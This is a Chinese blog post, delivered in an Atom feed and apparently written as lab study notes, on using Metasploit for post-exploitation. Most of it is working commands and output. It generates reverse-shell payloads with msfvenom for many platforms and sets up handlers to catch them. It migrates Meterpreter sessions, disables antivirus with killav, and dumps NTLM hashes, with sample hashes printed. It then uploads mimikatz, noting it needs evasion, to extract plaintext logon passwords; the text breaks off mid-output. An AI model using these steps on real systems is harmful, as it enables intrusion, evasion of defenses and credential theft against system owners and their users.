<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hexo</title>
  
  
  <link href="http://s1eady.top/atom.xml" rel="self"/>
  
  <link href="http://s1eady.top/"/>
  <updated>2020-10-13T12:00:37.897Z</updated>
  <id>http://s1eady.top/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>内网学习--Metasploit使用</title>
    <link href="http://s1eady.top/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/"/>
    <id>http://s1eady.top/2020/08/22/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--Metasploit%E4%BD%BF%E7%94%A8/</id>
    <published>2020-08-22T14:46:26.000Z</published>
    <updated>2020-10-13T12:00:37.897Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Metasploit使用"><a href="#Metasploit使用" class="headerlink" title="Metasploit使用"></a>Metasploit使用</h1><h3 id="基础常用命令"><a href="#基础常用命令" class="headerlink" title="基础常用命令"></a>基础常用命令</h3><h4 id="进入CMD-shell"><a href="#进入CMD-shell" class="headerlink" title="进入CMD-shell"></a>进入CMD-shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 4180 created.</span><br><span class="line">Channel 3 created.</span><br><span class="line">Microsoft Windows [�汾 6.1.7601]</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator.WEB\Desktop&gt;</span><br></pre></td></tr></table></figure><h4 id="解决中文乱码问题"><a href="#解决中文乱码问题" class="headerlink" title="解决中文乱码问题"></a>解决中文乱码问题</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chcp 65001</span><br></pre></td></tr></table></figure><p>或者将终端临时设置为GBK系列编码即可</p><h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><h5 id="常见shell生成"><a href="#常见shell生成" class="headerlink" title="常见shell生成"></a>常见shell生成</h5><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">Linux：</span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">Windows:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">PHP:</span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"></span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo <span class="string">&#x27;&lt;?php &#x27;</span> | tr -d <span class="string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP:</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP:</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">Python:</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"></span><br><span class="line">Bash:</span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"></span><br><span class="line">Perl:</span><br><span class="line">msfvenom -p cmd/unix/reverse</span><br><span class="line">_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><h5 id="PHP-Shell"><a href="#PHP-Shell" class="headerlink" title="PHP-Shell"></a>PHP-Shell</h5><ul><li><p>生成一句话木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP LPORT&#x3D;监听端口 R &gt; shell.php</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">➜  Desktop msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.1.109 LPORT&#x3D;1234 R &gt; shell.php</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload</span><br><span class="line">[-] No arch selected, selecting arch: php from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 1114 bytes</span><br></pre></td></tr></table></figure></li><li><p>msfconsole 监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; php&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 攻击IP</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 监听端口</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line">[-] Handler failed to bind to 192.168.0.108:1234:-  -</span><br><span class="line">[*] Started reverse TCP handler on 0.0.0.0:1234</span><br></pre></td></tr></table></figure></li></ul><h5 id="EXE-木马"><a href="#EXE-木马" class="headerlink" title="EXE-木马"></a>EXE-木马</h5><ul><li><p>生成木马</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;攻击IP  LPORT&#x3D;监听端口 -f exe &gt; hacker.exe</span><br></pre></td></tr></table></figure></li><li><p>msfconsole监听端口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 攻击IP</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LPORT 监听端口</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure></li></ul><h3 id="升级正常的Shell到Meterpreter"><a href="#升级正常的Shell到Meterpreter" class="headerlink" title="升级正常的Shell到Meterpreter"></a>升级正常的Shell到Meterpreter</h3><p>通常情况下， 当我们通过直接渗透进入系统， 并且得到了远程系统的Shell，下一步我们想要获得是Meterpreter Shell,  因为Meterpreter Shell可以向我们提供更多功能。 比如说， 提升权限， 整合到现有运行程序等等。这方面Sessions  Command 可以帮助我们实现从Shell 到Meterpreter提升。</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">msf5&gt;run post/multi/manage/shell_to_meterpreter</span><br><span class="line">msf5 post(multi/manage/shell_to_meterpreter) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (post/multi/manage/shell_to_meterpreter):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection</span><br><span class="line">   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).</span><br><span class="line">   LPORT    4433             yes       Port for payload to connect to.</span><br><span class="line">   SESSION                   yes       The session to run this module on.</span><br><span class="line">msf5&gt;set session 2</span><br><span class="line">msf5&gt;run</span><br></pre></td></tr></table></figure><p>使用一下命名进行切换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sessions -u sessionid</span><br></pre></td></tr></table></figure><h3 id="会话操作"><a href="#会话操作" class="headerlink" title="会话操作"></a>会话操作</h3><h4 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions #查看会话</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br></pre></td></tr></table></figure><h4 id="将回话保存到后台，进入会话"><a href="#将回话保存到后台，进入会话" class="headerlink" title="将回话保存到后台，进入会话"></a>将回话保存到后台，进入会话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">切换到会话1</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br></pre></td></tr></table></figure><h4 id="查看会话"><a href="#查看会话" class="headerlink" title="查看会话"></a>查看会话</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; sessions -l</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">  Id  Name  Type                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  2         meterpreter x86&#x2F;windows  NT AUTHORITY\SYSTEM @ STU1  172.20.10.3:1234 -&gt; 172.20.10.6:6990 (172.20.10.6)</span><br></pre></td></tr></table></figure><p>抓取hash密码–需要AUTHORITY\SYSTEM权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200903163754_default_172.20.10.6_windows.hashes_560643.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line">[*] No users with password hints on this system</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] whoami:1004:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::</span><br><span class="line">[+] steady:1012:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::</span><br><span class="line">[+] steady123:1013:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::</span><br></pre></td></tr></table></figure><p>如果没有权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line"></span><br><span class="line">[*] Running module against WEB</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20201012180509_default_172.20.10.13_windows.hashes_113739.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[-] On this version of Windows you need to be NT AUTHORITY\SYSTEM to dump the hashes</span><br><span class="line">[-] Try setting GETSYSTEM to true.</span><br></pre></td></tr></table></figure><h3 id="进程迁移"><a href="#进程迁移" class="headerlink" title="进程迁移"></a>进程迁移</h3><p>在刚获得的Meterpreter Shell时，该shell极其脆弱和易受攻击的，所以获得此shell的<strong>第一步就是将其迁移</strong>，把它和目标机中一个稳定的进程绑定在一起，而不需要对磁盘进行任何写入操作。</p><h4 id="查看当前活跃进程"><a href="#查看当前活跃进程" class="headerlink" title="查看当前活跃进程"></a>查看当前活跃进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process List</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"> PID   PPID  Name                  Arch  Session  User                          Path</span><br><span class="line"> ---   ----  ----                  ----  -------  ----                          ----</span><br><span class="line"> 0     0     [System Process]</span><br><span class="line"> 4     0     System                x64   0</span><br><span class="line"> 124   500   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe</span><br><span class="line"> 256   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe</span><br><span class="line"> 340   332   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> 392   332   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe</span><br><span class="line"> 404   384   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe</span><br><span class="line"> 440   384   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe</span><br><span class="line"> 500   392   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe</span><br></pre></td></tr></table></figure><h4 id="获取当前进程的PID"><a href="#获取当前进程的PID" class="headerlink" title="获取当前进程的PID"></a>获取当前进程的PID</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getpid</span><br><span class="line">Current pid: 1912</span><br></pre></td></tr></table></figure><h4 id="杀死进程"><a href="#杀死进程" class="headerlink" title="杀死进程"></a>杀死进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill &lt;pid值&gt;</span><br></pre></td></tr></table></figure><h4 id="迁移进程"><a href="#迁移进程" class="headerlink" title="迁移进程"></a>迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br></pre></td></tr></table></figure><h4 id="自动迁移进程"><a href="#自动迁移进程" class="headerlink" title="自动迁移进程"></a>自动迁移进程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">自动迁移进程命令：run post&#x2F;windows&#x2F;manage&#x2F;migrate</span><br></pre></td></tr></table></figure><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h4><h5 id="查看当前用户权限"><a href="#查看当前用户权限" class="headerlink" title="查看当前用户权限"></a>查看当前用户权限</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getuid # 查看权限</span><br></pre></td></tr></table></figure><h5 id="查看系统信息"><a href="#查看系统信息" class="headerlink" title="查看系统信息"></a>查看系统信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : WEB</span><br><span class="line">OS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : DE1AY</span><br><span class="line">Logged On Users : 3</span><br><span class="line">Meterpreter     : x86&#x2F;windows</span><br></pre></td></tr></table></figure><h5 id="获取软件安装信息"><a href="#获取软件安装信息" class="headerlink" title="获取软件安装信息"></a>获取软件安装信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_applications</span><br><span class="line"></span><br><span class="line">[*] Enumerating applications installed on WEB</span><br><span class="line"></span><br><span class="line">Installed Applications</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line"> Name                                                                                  Version</span><br><span class="line"> ----                                                                                  -------</span><br><span class="line"> 360安全卫士                                                                               12.0.0.2002</span><br><span class="line"> 360安全卫士                                                                               12.0.0.2002</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946040)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946040)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946308)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946308)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946344)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB946344)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947540)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947540)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947789)       1</span><br><span class="line"> Hotfix for Microsoft Visual Studio 2007 Tools for Applications - ENU (KB947789)       1</span><br><span class="line"> Microsoft Office 2003 Web Components                                                  12.0.6213.1000</span><br><span class="line"> Microsoft Office 2003 Web Components                                                  12.0.6213.1000</span><br></pre></td></tr></table></figure><h5 id="关闭杀毒软件"><a href="#关闭杀毒软件" class="headerlink" title="关闭杀毒软件"></a>关闭杀毒软件</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;killav</span><br></pre></td></tr></table></figure><h5 id="判断是否是虚拟机"><a href="#判断是否是虚拟机" class="headerlink" title="判断是否是虚拟机"></a>判断是否是虚拟机</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">run post&#x2F;linux&#x2F;gather&#x2F;checkvm #是否虚拟机</span><br><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;checkvm</span><br></pre></td></tr></table></figure><h5 id="查看补丁信息"><a href="#查看补丁信息" class="headerlink" title="查看补丁信息"></a>查看补丁信息</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;enum_patches  #补丁信息</span><br><span class="line">meterpreter &gt; run post&#x2F;windows&#x2F;gather&#x2F;enum_patches</span><br><span class="line"></span><br><span class="line">[*] Patch list saved to &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200906182724_default_172.20.10.6_enum_patches_447671.txt</span><br><span class="line">[*] KB2534111 applied</span><br><span class="line">[*] KB2999226 applied</span><br><span class="line">[*] KB976902 applied</span><br></pre></td></tr></table></figure><h5 id="Hash与明文密码获取"><a href="#Hash与明文密码获取" class="headerlink" title="Hash与明文密码获取"></a>Hash与明文密码获取</h5><p>获取目标机系统用户Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;gather&#x2F;smart_hashdump</span><br><span class="line">[*] Running module against STU1</span><br><span class="line">[*] Hashes will be saved to the database if one is connected.</span><br><span class="line">[+] Hashes will be saved in loot in JtR password file format to:</span><br><span class="line">[*] &#x2F;Users&#x2F;apple&#x2F;.msf4&#x2F;loot&#x2F;20200903163754_default_172.20.10.6_windows.hashes_560643.txt</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[*] Running as SYSTEM extracting hashes from registry</span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY fd4639f4e27c79683ae9fee56b44393f...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hints...</span><br><span class="line">[*] No users with password hints on this system</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line">[+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">[+] whoami:1004:aad3b435b51404eeaad3b435b51404ee:e5292ea58e7e150003e00454b6bc729a:::</span><br><span class="line">[+] steady:1012:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::</span><br><span class="line">[+] steady123:1013:aad3b435b51404eeaad3b435b51404ee:218a30a4dc767f75f1456e646a5d07cd:::</span><br></pre></td></tr></table></figure><p>获得了本地账户的hask，获取明文密码，我们需要先载入mimikatz模块(需要免杀处理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload mimikatz.exe 目标位置</span><br></pre></td></tr></table></figure><p>mimikatz的使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">c:\\mimikatz.exe</span><br><span class="line"></span><br><span class="line">c:\&gt;mimikatz.exe</span><br><span class="line">mimikatz.exe</span><br><span class="line"></span><br><span class="line">  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 16 2020 10:26:39</span><br><span class="line"> .## ^ ##.  &quot;A La Vie, A L&#39;Amour&quot; - (oe.eo)</span><br><span class="line"> ## &#x2F; \ ##  &#x2F;*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )</span><br><span class="line"> ## \ &#x2F; ##       &gt; http:&#x2F;&#x2F;blog.gentilkiwi.com&#x2F;mimikatz</span><br><span class="line"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )</span><br><span class="line">  &#39;#####&#39;        &gt; http:&#x2F;&#x2F;pingcastle.com &#x2F; http:&#x2F;&#x2F;mysmartlogon.com   ***&#x2F;</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">Privilege &#39;20&#39; OK</span><br><span class="line">mimikatz # sekurlsa::logonPasswords</span><br><span class="line">Authentication Id : 0 ; 2499588 (00000000:00262404)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : Administrator</span><br><span class="line">Domain            : GOD</span><br><span class="line">Logon Server      : OWA</span><br><span class="line">Logon Time        : 2020&#x2F;9&#x2F;3 13:38:09</span><br><span class="line">SID               : 